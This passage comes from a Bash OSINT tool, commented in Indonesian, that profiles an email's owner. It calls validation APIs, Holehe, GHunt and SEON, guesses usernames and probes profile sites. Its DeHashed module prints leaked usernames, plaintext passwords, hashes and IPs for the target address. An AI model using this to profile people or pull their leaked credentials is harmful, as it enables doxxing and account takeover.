  jq -e '.data' >/dev/null 2>&1 <<< "$j" || return 1
  st=$(jq -r '.data.status // "unknown"' <<< "$j"); sc=$(jq -r '.data.score // "?"' <<< "$j")
  addl "Status" "$st (skor $sc/100)"
  addl "Webmail" "$(jq -r 'if .data.webmail then "ya" else "tidak" end' <<< "$j")"
  addl "Accept-all" "$(jq -r 'if .data.accept_all then "ya (server menerima semua alamat, hasil kurang pasti)" else "tidak" end' <<< "$j")"
  addl "SMTP" "server $(jq -r '.data.smtp_server' <<< "$j"), cek: $(jq -r '.data.smtp_check' <<< "$j")"
  [ "$(jq -r '.data.gibberish // false' <<< "$j")" = true ] && addl "Pola nama" "terlihat acak (gibberish)"
  nsrc=$(jq -r '(.data.sources // []) | length' <<< "$j")
  if [ "$nsrc" -gt 0 ]; then
    addl "Ditemukan di web" "$nsrc halaman publik (data Hunter)"
    local d u
    while IFS=$'\t' read -r d u; do addk "$d" "$u"; done < <(jq -r '(.data.sources // [])[:8][] | [.domain, .uri] | @tsv' <<< "$j")
  fi
  case "$st" in
    valid) delta=20 ;; accept_all) delta=3 ;; webmail) delta=2 ;;
    invalid) delta=-50; state=bad ;; disposable) delta=-50; state=bad ;; *) state=info ;;
  esac
  [ "$nsrc" -gt 0 ] && delta=$((delta + 8))
  emit hunter "Hunter" "$state" "$delta" "status $st, skor $sc"
}

em_abstract() {
  local e=$1 j dl q delta=0 state=ok
  local -a _L=() _K=() _F=()
  quota_take abstract || return 1
  j=$(fetch -G --data-urlencode "email=$e" --data-urlencode "api_key=$ABSTRACT_API_KEY" "https://emailvalidation.abstractapi.com/v1/") || return 1
  jq -e '.email' >/dev/null 2>&1 <<< "$j" || return 1
  dl=$(jq -r '.deliverability // "UNKNOWN"' <<< "$j"); q=$(jq -r '.quality_score // "?"' <<< "$j")
  addl "Deliverability" "$dl (skor kualitas $q)"
  addl "Format valid" "$(jq -r 'if .is_valid_format.value then "ya" else "tidak" end' <<< "$j")"
  addl "MX ditemukan" "$(jq -r 'if .is_mx_found.value then "ya" else "tidak" end' <<< "$j")"
  addl "SMTP valid" "$(jq -r 'if .is_smtp_valid.value then "ya" else "tidak" end' <<< "$j")"
  addl "Email gratis" "$(jq -r 'if .is_free_email.value then "ya" else "tidak" end' <<< "$j")"
  addl "Sekali pakai" "$(jq -r 'if .is_disposable_email.value then "ya" else "tidak" end' <<< "$j")"
  addl "Akun peran" "$(jq -r 'if .is_role_email.value then "ya" else "tidak" end' <<< "$j")"
  addl "Catch-all" "$(jq -r 'if .is_catchall_email.value then "ya" else "tidak" end' <<< "$j")"
  [ -n "$(jq -r '.autocorrect // empty' <<< "$j")" ] && addl "Saran koreksi" "$(jq -r .autocorrect <<< "$j")"
  case "$dl" in DELIVERABLE) delta=20 ;; UNDELIVERABLE) delta=-50; state=bad ;; RISKY) delta=-10; state=warn ;; *) state=info ;; esac
  jq -e '.is_disposable_email.value == true' >/dev/null <<< "$j" && { delta=$((delta - 40)); state=bad; }
  emit abstract "Abstract API" "$state" "$delta" "$dl, kualitas $q"
}

em_zerobounce() {
  local e=$1 j st sub fn ln delta=0 state=ok
  local -a _L=() _K=() _F=()
  quota_take zerobounce || return 1
  j=$(fetch -G --data-urlencode "api_key=$ZEROBOUNCE_API_KEY" --data-urlencode "email=$e" --data-urlencode "ip_address=" \
        "https://api.zerobounce.net/v2/validate") || return 1
  jq -e '.status' >/dev/null 2>&1 <<< "$j" || return 1
  st=$(jq -r '.status' <<< "$j"); sub=$(jq -r '.sub_status // ""' <<< "$j")
  addl "Status" "$st${sub:+ ($sub)}"
  addl "Email gratis" "$(jq -r 'if .free_email then "ya" else "tidak" end' <<< "$j")"
  [ -n "$(jq -r '.did_you_mean // empty' <<< "$j")" ] && addl "Mungkin maksudnya" "$(jq -r .did_you_mean <<< "$j")"
  [ -n "$(jq -r '.domain_age_days // empty' <<< "$j")" ] && addl "Umur domain" "$(jq -r .domain_age_days <<< "$j") hari"
  [ -n "$(jq -r '.smtp_provider // empty' <<< "$j")" ] && addl "Penyedia SMTP" "$(jq -r .smtp_provider <<< "$j")"
  [ -n "$(jq -r '.mx_record // empty' <<< "$j")" ] && addl "MX" "$(jq -r .mx_record <<< "$j")"
  fn=$(jq -r '.firstname // empty' <<< "$j"); ln=$(jq -r '.lastname // empty' <<< "$j")
  [ -n "$fn$ln" ] && { addl "Nama (data ZeroBounce)" "$fn $ln"; addf nama "$fn $ln"; }
  case "$st" in
    valid) delta=20 ;; catch-all) delta=2; state=info ;;
    invalid|spamtrap|abuse|do_not_mail) delta=-50; state=bad ;;
    *) state=info ;;
  esac
  emit zerobounce "ZeroBounce" "$state" "$delta" "status $st${sub:+ ($sub)}"
}

em_ipqs() {
  local e=$1 j fs delta=0 state=ok
  local -a _L=() _K=() _F=()
  quota_take ipqs || return 1
  j=$(fetch "https://www.ipqualityscore.com/api/json/email/$IPQS_API_KEY/$(urlenc "$e")") || return 1
  jq -e '.success == true' >/dev/null 2>&1 <<< "$j" || return 1
  fs=$(jq -r '.fraud_score // 0' <<< "$j")
  addl "Skor fraud" "$fs/100"
  addl "Valid" "$(jq -r 'if .valid then "ya" else "tidak" end' <<< "$j")"
  addl "Deliverability" "$(jq -r '.deliverability // "?"' <<< "$j")"
  addl "Sekali pakai" "$(jq -r 'if .disposable then "ya" else "tidak" end' <<< "$j")"
  addl "Penyalahgunaan terbaru" "$(jq -r 'if .recent_abuse then "ya" else "tidak" end' <<< "$j")"
  addl "Honeypot / spam trap" "$(jq -r '"honeypot: " + (if .honeypot then "ya" else "tidak" end) + ", spam trap: " + (.spam_trap_score // "none")' <<< "$j")"
  addl "Pernah bocor" "$(jq -r 'if .leaked then "ya" else "tidak" end' <<< "$j")"
  [ "$(jq -r '.first_seen.human // empty' <<< "$j")" != "" ] && addl "Pertama terlihat" "$(jq -r '.first_seen.human' <<< "$j")"
  [ "$(jq -r '.domain_age.human // empty' <<< "$j")" != "" ] && addl "Umur domain" "$(jq -r '.domain_age.human' <<< "$j")"
  if [ "$fs" -ge 75 ]; then delta=-35; state=bad
  elif [ "$fs" -gt 20 ]; then delta=-5; state=warn
  else delta=10; fi
  jq -e '.recent_abuse == true' >/dev/null <<< "$j" && { delta=$((delta - 25)); state=bad; }
  jq -e '.honeypot == true' >/dev/null <<< "$j" && { delta=$((delta - 20)); state=bad; }
  jq -e '.disposable == true' >/dev/null <<< "$j" && { delta=$((delta - 40)); state=bad; }
  emit ipqs "IPQualityScore" "$state" "$delta" "skor fraud $fs/100"
}

# ---------- 8. tool OSINT eksternal & layanan tambahan ----------
# Holehe dan GHunt dipanggil sebagai program terpisah yang kamu pasang sendiri
# (pipx install holehe ; pipx install ghunt, lalu `ghunt login`). Aktif otomatis jika ada di PATH.
em_active() { # $1 = daftar syarat: NAMA_ENV atau cmd:program
  local v
  for v in $1; do
    case "$v" in
      cmd:*) command -v "${v#cmd:}" >/dev/null 2>&1 || return 1 ;;
      *) [ -n "${!v:-}" ] || return 1 ;;
    esac
  done
  return 0
}

em_holehe() {
  local e=$1 out site n=0 sites=()
  local -a _L=() _K=() _F=()
  out=$(timeout 150 holehe --only-used --no-color --no-clear "$e" 2>/dev/null | sed 's/\x1b\[[0-9;]*[A-Za-z]//g') || return 1
  while IFS= read -r site; do
    [ -z "$site" ] && continue
    sites+=("$site"); addf akun "Terdaftar di $site"
  done < <(sed -n 's/^\[+\][[:space:]]*\([A-Za-z0-9._-]*\).*/\1/p' <<< "$out")
  n=${#sites[@]}
  if [ "$n" -eq 0 ]; then
    addl "Hasil" "tidak ada akun terdeteksi di situs yang didukung Holehe"
    emit holehe "Holehe" info 0 "tidak ada akun terdeteksi"; return 0
  fi
  addl "Akun terdeteksi" "$n situs"
  addl "Situs" "$(IFS=,; printf '%s' "${sites[*]}" | sed 's/,/, /g')"
  emit holehe "Holehe" ok $(( n > 5 ? 10 : n * 2 )) "terdaftar di $n situs"
}

em_ghunt() {
  local e=$1 d=${1##*@} tmp gaia name photo
  local -a _L=() _K=() _F=()
  [ "$d" = gmail.com ] || [ "$d" = googlemail.com ] || { emit ghunt "GHunt" info 0 "dilewati (bukan alamat Gmail)"; return 0; }
  tmp=$(mktemp -d)
  timeout 120 ghunt email "$e" --json "$tmp/out.json" >/dev/null 2>&1 || { rm -rf "$tmp"; return 1; }
  [ -s "$tmp/out.json" ] || { rm -rf "$tmp"; return 1; }
  gaia=$(jq -r '[.. | objects | .personId? // empty] | .[0] // empty' "$tmp/out.json" 2>/dev/null)
  name=$(jq -r '[.. | objects | .fullname? // empty] | .[0] // empty' "$tmp/out.json" 2>/dev/null)
  photo=$(jq -r '[.. | objects | select(has("profilePhotos")) | .profilePhotos | .. | objects | .url? // empty] | .[0] // empty' "$tmp/out.json" 2>/dev/null)
  rm -rf "$tmp"
  if [ -z "$gaia" ] && [ -z "$name" ]; then
    addl "Hasil" "tidak ada profil Google publik (atau format keluaran GHunt tidak dikenali)"
    emit ghunt "GHunt" info 0 "tidak ada profil publik"; return 0
  fi
  [ -n "$gaia" ] && { addl "Gaia ID" "$gaia"; addk "Google Maps (kontribusi)" "https://www.google.com/maps/contrib/$gaia"; }
  [ -n "$name" ] && { addl "Nama profil Google" "$name"; addf nama "$name"; }
  [ -n "$photo" ] && addk "Foto profil" "$photo"
  [ -n "$gaia" ] && addf akun "Google Maps: https://www.google.com/maps/contrib/$gaia"
  emit ghunt "GHunt" ok 10 "profil Google publik ditemukan${name:+ ($name)}"
}

em_dehashed() {
  local e=$1 r code body n
  local -a _L=() _K=() _F=()
  quota_take dehashed || return 1
  r=$(http_get -X POST -H "Dehashed-Api-Key: $DEHASHED_API_KEY" -H 'Content-Type: application/json' \
        -d "$(jq -nc --arg q "email:$e" '{query:$q, page:1, size:100}')" "https://api.dehashed.com/v2/search") || return 1
  code=${r##*$'\n'}; body=${r%$'\n'*}
  [ "$code" = 200 ] || return 1
  jq -e '.entries' >/dev/null 2>&1 <<< "$body" || return 1
  n=$(jq -r '.total // (.entries | length)' <<< "$body")
  if [ "$n" -eq 0 ]; then
    addl "Hasil" "tidak ada catatan di DeHashed"
    emit dehashed "DeHashed" ok 0 "tidak ada catatan"; return 0
  fi
  addl "Catatan" "$n entri"
  addl "Basis data" "$(jq -r '[.entries[].database_name // empty] | unique | .[:15] | join(", ")' <<< "$body")"
  addl "Jenis data terpapar" "$(jq -r '[.entries[] | to_entries[] | select(.value != null and .value != "" and .value != []) | .key]
      | map(select(. != "id" and . != "email" and . != "database_name"))
      | map(if . == "hashed_password" or . == "password" then "kata sandi/hash" elif . == "ip_address" then "alamat IP" else . end)
      | unique | join(", ")' <<< "$body")"

  # --- Tampilkan Rincian Entri (Username, Password, Hash, IP Address) ---
  while IFS=$'\t' read -r db user pass hp ip; do
    local info=""
    [ -n "$user" ] && info="${info}User: $user | "
    [ -n "$pass" ] && info="${info}Pass: $pass | "
    [ -n "$hp" ]   && info="${info}Hash: $hp | "
    [ -n "$ip" ]   && info="${info}IP: $ip | "
    info=${info% | }
    [ -n "$info" ] && addl "Entri ($db)" "$info"
  done < <(jq -r '.entries[:10][] | [.database_name, .username, .password, .hashed_password, .ip_address] | map(. // "") | @tsv' <<< "$body")

  addk "DeHashed" "https://dehashed.com/"
  emit dehashed "DeHashed" warn 4 "$n entri di basis data kebocoran"
}

em_seon() {
  local e=$1 r code body sc delta=0 state=ok accts
  local -a _L=() _K=() _F=()
  quota_take seon || return 1
  r=$(http_get -H "X-API-KEY: $SEON_API_KEY" "https://api.seon.io/SeonRestService/email-api/v2.2/$(urlenc "$e")") || return 1
  code=${r##*$'\n'}; body=${r%$'\n'*}
  [ "$code" = 200 ] || return 1
  jq -e '.data' >/dev/null 2>&1 <<< "$body" || return 1
  sc=$(jq -r '.data.score // empty' <<< "$body")
  [ -n "$sc" ] && addl "Skor fraud SEON" "$sc/100 (makin tinggi makin berisiko)"
  addl "Deliverable" "$(jq -r 'if .data.deliverable == true then "ya" elif .data.deliverable == false then "tidak" else "?" end' <<< "$body")"
  jq -e '.data.domain_details' >/dev/null 2>&1 <<< "$body" && {
    addl "Domain" "$(jq -r '.data.domain_details | "dibuat \(.created // "?"), registrar \(.registrar_name // "?"), sekali pakai: \(.disposable), MX valid: \(.valid_mx)"' <<< "$body")"
  }
  accts=$(jq -r '(.data.account_details // {}) | to_entries | map(select(.value.registered == true) | .key) | join(", ")' <<< "$body")
  if [ -n "$accts" ]; then
    addl "Terdaftar di" "$accts"
    local x; while IFS= read -r x; do [ -n "$x" ] && addf akun "Terdaftar di $x"; done < <(tr ',' '\n' <<< "$accts" | sed 's/^ *//')
    delta=$((delta + 8))
  else addl "Terdaftar di" "tidak ada akun terdeteksi di platform yang dicek SEON"; fi
  jq -e '.data.breach_details.haveibeenpwned_listed == true' >/dev/null 2>&1 <<< "$body" \
    && addl "Kebocoran" "tercatat di HaveIBeenPwned ($(jq -r '.data.breach_details.number_of_breaches // "?"' <<< "$body") kebocoran, pertama $(jq -r '.data.breach_details.first_breach // "?"' <<< "$body"))"
  if [ -n "$sc" ]; then
    sc=${sc%.*}
    if [ "$sc" -ge 70 ] 2>/dev/null; then delta=$((delta - 30)); state=bad
    elif [ "$sc" -le 20 ] 2>/dev/null; then delta=$((delta + 10)); fi
  fi
  emit seon "SEON" "$state" "$delta" "${sc:+skor fraud $sc/100}${accts:+, akun di $accts}"
}

# ---------- 9. pivoting username (tebakan, tanpa permintaan jaringan) ----------
# Nama sebelum @ sering dipakai juga sebagai username. Ini hanya TEBAKAN: halamannya tidak dibuka,
# tidak ikut menaikkan skor (delta 0). Username-nya tetap ditampilkan di "Temuan pengayaan utama".
# ---------- 9. pivoting username (ekstraksi & tautan pintar) ----------
em_pivoting() {
  local e=$1 l=${1%@*} u
  local -a _L=() _K=() _F=()
  u=${l%%+*}
  
  if [ "${#u}" -lt 3 ] || [[ $ROLE_LOCAL == *" $u "* ]]; then
    addl "Username ekstraksi" "Dilewati (nama terlalu pendek atau merupakan akun peran/umum)"
    emit pivoting "Pivoting username" info 0 "dilewati"
    return 0
  fi

  addl "Username terekstrak" "$u"
  addf username "$u"

  # Tautan Pivoting Lanjutan
  addk "GitHub Profil" "https://github.com/$u"
  addk "GitLab Profil" "https://gitlab.com/$u"
  addk "Instagram Profil" "https://www.instagram.com/$u"
  addk "Twitter/X Profil" "https://x.com/$u"
  addk "Telegram Profil" "https://t.me/$u"
  addk "WhatsMyName OSINT" "https://whatsmyname.app/?q=$u"

  emit pivoting "Pivoting username" ok 0 "Username \"$u\" berhasil diekstrak untuk pivoting OSINT"
}

# ---------- 10. platform kreatif & desain (cek profil publik dari tebakan username) ----------
# BUKAN cek "email terdaftar". Yang diperiksa hanya: apakah halaman profil publik dengan username
# tebakan (bagian sebelum @) ada di platform itu. Tiap platform dikontrol dulu dengan username acak
# yang pasti tidak ada. Jika situs membalas "ada" juga untuk username acak itu (atau memblokir bot,
# atau butuh login), hasilnya ditandai "tidak bisa dipastikan" dan TIDAK dihitung sebagai temuan.
# Tidak menembus proteksi anti-bot dan tidak mengubah skor. Username umum sering dipakai orang lain.
# Menambah platform = tambah satu baris "Nama|URL" (pakai {u} untuk username) di daftar ini.
KREATIF_PLATFORMS=(
  "Figma|https://www.figma.com/@{u}"
  "Canva|https://www.canva.com/p/{u}/"
  "Pinterest|https://www.pinterest.com/{u}/"
  "Behance|https://www.behance.net/{u}"
  "Dribbble|https://dribbble.com/{u}"
  "ArtStation|https://www.artstation.com/{u}"
  "DeviantArt|https://www.deviantart.com/{u}"
  "Flickr|https://www.flickr.com/people/{u}"
  "500px|https://500px.com/p/{u}"
  "Unsplash|https://unsplash.com/@{u}"
  "Pexels|https://www.pexels.com/@{u}"
  "SoundCloud|https://soundcloud.com/{u}"
  "Vimeo|https://vimeo.com/{u}"
  "Medium|https://medium.com/@{u}"
  "Tumblr|https://{u}.tumblr.com"
  "Linktree|https://linktr.ee/{u}"
  "Ko-fi|https://ko-fi.com/{u}"
  "Patreon|https://www.patreon.com/{u}"
  "Gumroad|https://{u}.gumroad.com"
  "Itch.io|https://{u}.itch.io"
  "Sketchfab|https://sketchfab.com/{u}"
  "CodePen|https://codepen.io/{u}"
  "Etsy|https://www.etsy.com/people/{u}"
)

kreatif_code() { # $1=URL -> kode HTTP akhir (setelah maks. 3 redirect); 000 jika gagal
  local c
  c=$(curl -s -o /dev/null -L --max-redirs 3 --max-time "$CURL_TIMEOUT" -A "$(get_random_ua)" -w '%{http_code}' "$1" 2>/dev/null)
  printf '%s' "${c: -3}"
}

em_kreatif() {
  local e=$1 l=${1%@*} u ctl d p n=0 f st nm ur
  local -a _L=() _K=() _F=() found=() unsure=()
  local checked=0 none=0
  u=${l%%+*}
  if [ "${#u}" -lt 3 ] || [ "${#u}" -gt 40 ] || [[ ! $u =~ ^[A-Za-z0-9._-]+$ ]] || [[ $ROLE_LOCAL == *" $u "* ]]; then
    addl "Username" "Dilewati (nama terlalu pendek/panjang, berisi karakter tak lazim, atau akun peran/umum)"
    emit kreatif "Platform kreatif" info 0 "dilewati"
    return 0
  fi
  ctl="fineu$(printf '%05x%05x' "$RANDOM" "$RANDOM")"
  d=$(mktemp -d) || return 1
  for p in "${KREATIF_PLATFORMS[@]}"; do
    n=$((n + 1)); nm=${p%%|*}
    # platform bergaya subdomain (nama.situs.com) hanya menerima huruf, angka, dan "-"
    if [[ ${p#*|} == "https://{u}."* ]] && [[ ! $u =~ ^[A-Za-z0-9-]+$ ]]; then continue; fi
    (
      local tpl=${p#*|} cu cc
      cu=$(kreatif_code "${tpl//'{u}'/$u}"); cc=$(kreatif_code "${tpl//'{u}'/$ctl}")
      if [ "$cc" = 404 ] || [ "$cc" = 410 ]; then
        if [ "$cu" = 200 ]; then st=found; else st=none; fi
      else st=unsure; fi
      printf '%s|%s|%s\n' "$st" "$nm" "${tpl//'{u}'/$u}" > "$d/$n"
    ) &
  done
  wait
  for ((f = 1; f <= n; f++)); do
    [ -f "$d/$f" ] || continue
    IFS='|' read -r st nm ur < "$d/$f"
    checked=$((checked + 1))
    case "$st" in
      found)  found+=("$nm"); addl "$nm" "profil publik ada: $ur"; addk "$nm" "$ur" ;;
      unsure) unsure+=("$nm") ;;
      *)      none=$((none + 1)) ;;
    esac
  done
  rm -rf "$d"
  local j sep="" out=""
  if [ "${#unsure[@]}" -gt 0 ]; then
    for j in "${unsure[@]}"; do out+="$sep$j"; sep=", "; done
    addl "Tidak bisa dipastikan" "$out (situs memblokir bot, butuh login, atau membalas \"ada\" untuk username acak)"
  fi
  addl "Catatan" "Tebakan dari username \"$u\", belum tentu pemilik email yang sama. Ini bukan bukti email terdaftar."
  emit kreatif "Platform kreatif" info 0 "${#found[@]} profil publik cocok, ${#unsure[@]} tidak bisa dipastikan, dari $checked platform (username \"$u\")"
}

# ---------- daftar modul ----------
# register_em  judul  kategori  fungsi  env-wajib
EM_NAME=(); EM_CAT=(); EM_FN=(); EM_REQ=()
register_em() { EM_NAME+=("$1"); EM_CAT+=("$2"); EM_FN+=("$3"); EM_REQ+=("${4:-}"); }
register_em "Sintaks & alamat"     "Validasi"        em_syntax
register_em "DNS & server email"   "Validasi"        em_dns
register_em "Email sekali pakai"   "Validasi"        em_disposable
register_em "Registrasi domain"    "Validasi"        em_rdap
register_em "Hunter"               "Validasi"        em_hunter     HUNTER_API_KEY
register_em "Abstract API"         "Validasi"        em_abstract   ABSTRACT_API_KEY
register_em "ZeroBounce"           "Validasi"        em_zerobounce ZEROBOUNCE_API_KEY
register_em "IPQualityScore"       "Validasi"        em_ipqs       IPQS_API_KEY
register_em "Gravatar"             "Jejak digital"   em_gravatar
register_em "GitHub"               "Jejak digital"   em_github
register_em "Kunci PGP"            "Jejak digital"   em_pgp
register_em "EmailRep"             "Jejak digital"   em_emailrep
register_em "Pivoting username"    "Jejak digital"   em_pivoting
register_em "Platform kreatif"     "Jejak digital"   em_kreatif
register_em "SEON"                 "Jejak digital"   em_seon       SEON_API_KEY
register_em "Holehe"               "Jejak digital"   em_holehe     cmd:holehe
register_em "GHunt"                "Jejak digital"   em_ghunt      cmd:ghunt
register_em "LeakCheck"            "Kebocoran data"  em_leakcheck
register_em "HaveIBeenPwned"       "Kebocoran data"  em_hibp       HIBP_API_KEY
register_em "DeHashed"             "Kebocoran data"  em_dehashed   DEHASHED_API_KEY

spin_wait() { # $1=folder $2=total $3=label
  local dir=$1 total=$2 label=$3 n=0 d frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  while :; do
    d=$(find "$dir" -name '*.done' | wc -l)
    [ -t 1 ] && printf '\r  %s%s%s %s %d/%d  ' "$CYN" "${frames[n % 10]}" "$R" "$label" "$d" "$total"
    [ "$d" -ge "$total" ] && break
    n=$((n + 1)); sleep 0.1
  done
  [ -t 1 ] && printf '\r\033[2K'
}

ETMP=""
run_email_scan() { # $1 = email (huruf kecil, sudah valid) ; hasil di $EREPORT dan $MENTIONS
  local e=$1 started i n=0 id f name cat took
  started=$(date +%s%N)
  ETMP=$(mktemp -d)
  for i in "${!EM_NAME[@]}"; do
    em_active "${EM_REQ[i]}" || continue
    n=$((n + 1)); id=$(printf '%03d' "$n")
    printf '%s|%s' "${EM_NAME[i]}" "${EM_CAT[i]}" > "$ETMP/$id.meta"
    (
      set -o pipefail
      QUOTA_MARK="$ETMP/$id.quota"
      if "${EM_FN[i]}" "$e" > "$ETMP/$id.tmp" 2>/dev/null && jq -e 'type == "object"' "$ETMP/$id.tmp" >/dev/null 2>&1; then
        mv "$ETMP/$id.tmp" "$ETMP/$id.json"
      else : > "$ETMP/$id.fail"; fi
      : > "$ETMP/$id.done"
    ) &
  done
  spin_wait "$ETMP" "$n" "Memeriksa email"

  : > "$ETMP/all.ndjson"
  for f in "$ETMP"/*.meta; do
    [ -e "$f" ] || continue
    id=$(basename "$f" .meta); IFS='|' read -r name cat < "$f"
    if [ -f "$ETMP/$id.json" ]; then
      jq -c --arg c "$cat" '. + {category:$c}' "$ETMP/$id.json" >> "$ETMP/all.ndjson"
    else
      local why="tidak bisa dijangkau saat ini"
      [ -s "$ETMP/$id.quota" ] && why="batas harian tercapai (atur di Setting > Limit harian)"
      jq -nc --arg t "$name" --arg c "$cat" --arg w "$why" \
        '{id:"gagal", title:$t, state:"fail", delta:0, summary:$w, lines:[], links:[], facts:[], category:$c}' >> "$ETMP/all.ndjson"
    fi
  done
  took=$(( ($(date +%s%N) - started) / 1000000 ))

  EREPORT=$(jq -s --arg e "$e" --arg date "$(date -Iseconds)" --argjson took "$took" '
    . as $m
    | ($m | map(.delta) | add // 0) as $sum
    | ([0, ([100, (40 + $sum)] | min)] | max) as $raw
    | ($m | map(select(.state == "bad" and (.id == "disposable" or .id == "dns" or .id == "syntax"))) | length > 0) as $hard
    | (if $hard then ([$raw, 20] | min) else $raw end) as $score
    | { type:"email", email:$e, date:$date, tookMs:$took, score:$score, hardFail:$hard,
        label:(if $hard then "Berisiko / tidak layak dipercaya"
               elif $score >= 75 then "Tinggi: kemungkinan besar alamat nyata dan aktif"
               elif $score >= 50 then "Sedang: tampak wajar, bukti terbatas"
               elif $score >= 25 then "Rendah: banyak sinyal lemah atau janggal"
               else "Berisiko / tidak layak dipercaya" end),
        reasons: ($m | map(select(.delta != 0)) | sort_by(-(.delta | fabs)) | .[:8]
                  | map({title, delta, summary})),
        facts: ($m | map(.facts // []) | add // [] | group_by(.t) | map({t:.[0].t, v:(map(.v) | unique)})),
        modules: $m,
        checked: ($m | length), failed: ($m | map(select(.state == "fail") | .title)) }' "$ETMP/all.ndjson")
  rm -rf "$ETMP"; ETMP=""

  # jejak di web: cari alamat persis lewat semua sumber umum yang aktif, hanya yang memuatnya harfiah
  MENTIONS='{"found":[],"total":0,"skipped":true}'
  if [ "${EMAIL_WEB_SCAN:-1}" != 0 ]; then
    SEARCH_MODE=akurat run_scan "\"$e\""
    MENTIONS=$(jq -c '.found |= (map(.items |= map(select(.rank >= 3))) | map(select(.items | length > 0)))
        | .total = ([.found[].items | length] | add // 0) | .skipped = false' <<< "$REPORT")
  fi
  EREPORT=$(jq -c --argjson m "$MENTIONS" '. + {mentions:$m}' <<< "$EREPORT")
}

# ---------- tampilan hasil email ----------
render_email_report() {
  local score label color filled bar i width
  score=$(jq -r '.score' <<< "$EREPORT"); label=$(jq -r '.label' <<< "$EREPORT")
  if [ "$score" -ge 75 ]; then color=$GRN; elif [ "$score" -ge 50 ]; then color=$YEL; else color=$RED; fi
  filled=$((score / 5)); bar=""
  for ((i = 0; i < 20; i++)); do [ "$i" -lt "$filled" ] && bar+="█" || bar+="░"; done
  width=$(( $(tput cols 2>/dev/null || echo 90) - 12 ))
  printf '  %sSKOR KEPERCAYAAN & KEKAYAAN DATA%s  %s%s %d/100%s\n' "$B" "$R" "$color" "$bar" "$score" "$R"
  printf '  %s%s%s\n\n' "$color" "$label" "$R"

  jq -r --arg B "$B" --arg D "$D" --arg G "$GRN" --arg Y "$YEL" --arg RD "$RED" --arg C "$CYN" --arg R "$R" --argjson w "$width" '
    def cut($n): gsub("\\s+";" ") | if length > $n then .[0:$n-1] + "…" else . end;
    def icon: if .state == "ok" then $G + "●" + $R elif .state == "warn" then $Y + "▲" + $R
              elif .state == "bad" then $RD + "✖" + $R elif .state == "fail" then $D + "✕" + $R
              else $D + "○" + $R end;
    def tl: {nama:"Nama", username:"Username", akun:"Akun / jejak", lokasi:"Lokasi", penyedia:"Penyedia email"};
    ( if (.facts | length) > 0 then
        ("  \($B)TEMUAN PENGAYAAN UTAMA\($R)  \($D)(dari sumber publik; belum tentu semuanya milik orang yang sama)\($R)"),
        (.facts | map(select((tl)[.t] != null)) | sort_by(. as $x | ["nama","username","akun","lokasi","penyedia"] | index($x.t))[]
          | "  \($D)\((tl)[.t] + (" " * (15 - ((tl)[.t] | length))))\($R)" + (.v | map(cut($w - 20)) | join("\n" + (" " * 17) ))),
        ""
      else empty end ),
    ( .reasons as $r | if ($r | length) > 0 then
        "  \($B)YANG MEMPENGARUHI SKOR\($R)",
        ($r[] | "  \(if .delta > 0 then $G + "+" + (.delta|tostring) else $RD + (.delta|tostring) end)\($R) \(.title)  \($D)\(.summary)\($R)"),
        ""
      else empty end ),
    ( .modules | group_by(.category) | sort_by(. as $g | ["Validasi","Jejak digital","Kebocoran data"] | index($g[0].category))[]
      | "  \($B)\(.[0].category | ascii_upcase)\($R)",
        (.[] | "  \(icon) \($B)\(.title)\($R) \($D)· \(.summary)\($R)",
           (.lines[] | "      \($D)\(.k):\($R) \(.v | cut($w - 8))"),
           (.links[:6][] | "      \($C)\(.u)\($R)"),
           ""))' <<< "$EREPORT"

  # jejak di web
  local mt; mt=$(jq -r '.mentions.total // 0' <<< "$EREPORT")
  printf '  %sJEJAK DI WEB%s\n' "$B" "$R"
  if [ "$(jq -r '.mentions.skipped // false' <<< "$EREPORT")" = true ]; then
    printf '  %sDimatikan (EMAIL_WEB_SCAN=0).%s\n\n' "$D" "$R"
  elif [ "$mt" -eq 0 ]; then
    printf '  %sTidak ada halaman publik yang memuat alamat ini secara harfiah di sumber yang aktif.%s\n' "$D" "$R"
    printf '  %sCakupan naik jika SearXNG / Brave / Tavily / Google CSE diisi di Setting.%s\n\n' "$D" "$R"
  else
    local REPORT QUERY=$EMAIL
    REPORT=$(jq -c '.mentions' <<< "$EREPORT")
    show_report
  fi
  [ "$mt" -eq 0 ] && quota_hit_note "$(jq -c '.mentions' <<< "$EREPORT")"
  local nf; nf=$(jq -r '.failed | length' <<< "$EREPORT")
  [ "$nf" -gt 0 ] && printf '  %s%s pemeriksaan tidak dijalankan (tidak terjangkau / batas harian): %s%s\n\n' "$D" "$nf" "$(jq -r '.failed | join(", ")' <<< "$EREPORT")" "$R"
  printf '  %sSkor adalah perkiraan dari sinyal publik, bukan jaminan. Gunakan dengan bertanggung jawab (UU PDP).%s\n\n' "$D" "$R"
}

save_email_report() { # mencetak path relatif file .md
  local dir="$EMAIL_DIR/$(email_slug "$EMAIL")" ts
  ts=$(date +%Y-%m-%d_%H-%M-%S)
  mkdir -p "$dir"
  printf '%s\n' "$EREPORT" > "$dir/$ts.json"
  jq -r '
    "# Cek email: \(.email)\n",
    "Skor kepercayaan **\(.score)/100** · \(.label) · \(.date)\n",
    (if (.facts | length) > 0 then "## Temuan utama\n", (.facts[] | "- **\(.t)**: \(.v | join("; "))"), "" else empty end),
    (if (.reasons | length) > 0 then "## Yang mempengaruhi skor\n", (.reasons[] | "- \(if .delta > 0 then "+" else "" end)\(.delta) \(.title): \(.summary)"), "" else empty end),
    (.modules | group_by(.category)[] | "## \(.[0].category)\n",
       (.[] | "### \(.title) · \(.summary)\n", (.lines[] | "- \(.k): \(.v)"), (.links[] | "- [\(.t)](\(.u))"), "")),
    "## Jejak di web\n",
    (if (.mentions.total // 0) == 0 then "Tidak ada halaman publik yang memuat alamat ini secara harfiah.\n"
     else (.mentions.found[] | "### \(.source) · \(.category)", (.items[] | "- [\(.title)](\(.url))" + (if .snippet != "" then "\n  \(.snippet)" else "" end)), "") end)
  ' <<< "$EREPORT" > "$dir/$ts.md"
  printf '%s' "${dir/#$PWD\//}/$ts.md"
}

email_do_check() { # $1 = email valid; mengisi EREPORT, MENTIONS, SAVED
  EMAIL=$1
  run_email_scan "$EMAIL"
  SAVED=$(save_email_report)
}

email_result_screen() {
  header
  printf '  Hasil pengayaan untuk: %s%s%s\n\n' "$B" "$EMAIL" "$R"
  render_email_report
  [ -n "$SAVED" ] && printf '  %s✓ Tersimpan:%s %s%s%s\n\n' "$GRN" "$R" "$D" "$SAVED" "$R"
}

email_session() {
  local notice="" in
  while :; do
    header
